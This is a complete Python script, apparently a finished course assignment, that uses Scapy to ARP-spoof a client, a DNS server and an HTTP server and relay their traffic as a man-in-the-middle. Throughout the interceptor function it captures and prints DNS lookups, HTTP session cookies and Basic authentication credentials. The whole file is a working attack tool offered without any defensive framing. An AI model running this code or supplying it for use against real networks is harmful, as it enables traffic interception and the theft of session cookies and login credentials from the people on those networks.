from scapy.all import *

import argparse
import sys
import threading
import time

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
    parser.add_argument("-ip2", "--dnsIP", help="IP of the dns server", required=True)
    parser.add_argument("-ip3", "--httpIP", help="IP of the http server", required=True)
    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=0, type=int)
    return parser.parse_args()


def debug(s):
    global verbosity
    if verbosity >= 1:
        print('#{0}'.format(s))
        sys.stdout.flush()


# DONE: returns the mac address for an IP
def mac(IP):
    return getmacbyip(IP)

#ARP spoofs client, httpServer, dnsServer
def spoof_thread(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC, interval=3):
    while True:
        spoof(httpServerIP, attackerMAC, clientIP, clientMAC) # Spoof client ARP table
        spoof(clientIP, attackerMAC, httpServerIP, httpServerMAC) # Spoof httpServer ARP table
        spoof(dnsServerIP, attackerMAC, clientIP, clientMAC) # Spoof client ARP table
        spoof(clientIP, attackerMAC, dnsServerIP, dnsServerMAC) # Spoof dnsServer ARP table
        time.sleep(interval)


# DONE: spoof ARP so that dst changes its ARP table entry for src 
def spoof(src_ip, src_mac, dst_ip, dst_mac):
    debug(f"spoofing {dst_ip}'s ARP table: setting {src_ip} to {src_mac}")
    sendp(Ether(dst=dst_mac, src=src_mac)/ARP(op=2, pdst=dst_ip, psrc=src_ip))

# DONE: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"restoring ARP table for {dstIP}")
    send(Ether(dst=dstMAC, src=srcMAC)/ARP(op=2, pdst=dstIP, psrc=srcIP))

# DONE: handle intercepted packets
import binascii
def interceptor(packet):
    global clientMAC, clientIP, httpServerMAC, httpServerIP, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC
    if packet[Ether].src == clientMAC and packet.haslayer(DNS):
        print("*hostname:" + packet[DNS].qd.qname.decode())
    if packet[Ether].src == dnsServerMAC and packet.haslayer(DNS):
        print("*hostaddr:" + packet[DNS].an.rdata)
    if packet[Ether].src == httpServerMAC and packet.haslayer(Raw):
        load = packet[Raw].load
        session_cookie = "Set-Cookie: session="
        if session_cookie.encode() in load:
            i = load.index(session_cookie.encode()) + len(session_cookie)
            j = load[i:].index("\r\n".encode())
            print("*cookie:" + load[i:i+j].decode())
    if packet[Ether].src == clientMAC and packet.haslayer(Raw):
        load = packet[Raw].load
        basic_auth = "Authorization: Basic "
        if basic_auth.encode() in load:
            i = load.index(basic_auth.encode()) + len(basic_auth)
            j = load[i:].index("\r\n".encode())
            print("*basicauth:" + load[i:i+j].decode())
    if packet.haslayer(IP):
        if packet[IP].dst == dnsServerIP:
            packet[Ether].dst = dnsServerMAC
            packet[Ether].src = attackerMAC
            sendp(packet)
        elif packet[IP].dst == httpServerIP:
            packet[Ether].dst = httpServerMAC
            packet[Ether].src = attackerMAC
            sendp(packet)
        elif packet[IP].dst == clientIP:
            packet[Ether].dst = clientMAC
            packet[Ether].src = attackerMAC
            sendp(packet)

if __name__ == "__main__":
    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0 # minimize scapy verbosity
    conf.iface = args.interface # set default interface

    clientIP = args.clientIP
    httpServerIP = args.httpIP
    dnsServerIP = args.dnsIP
    attackerIP = get_if_addr(args.interface)

    clientMAC = mac(clientIP)
    httpServerMAC = mac(httpServerIP)
    dnsServerMAC = mac(dnsServerIP)
    attackerMAC = get_if_hwaddr(args.interface)

    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
    sniff_th.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, httpServerIP, httpServerMAC)
        restore(clientIP, clientMAC, dnsServerIP, dnsServerMAC)
        restore(httpServerIP, httpServerMAC, clientIP, clientMAC)
        restore(dnsServerIP, dnsServerMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, httpServerIP, httpServerMAC)
    restore(clientIP, clientMAC, dnsServerIP, dnsServerMAC)
    restore(httpServerIP, httpServerMAC, clientIP, clientMAC)
    restore(dnsServerIP, dnsServerMAC, clientIP, clientMAC)
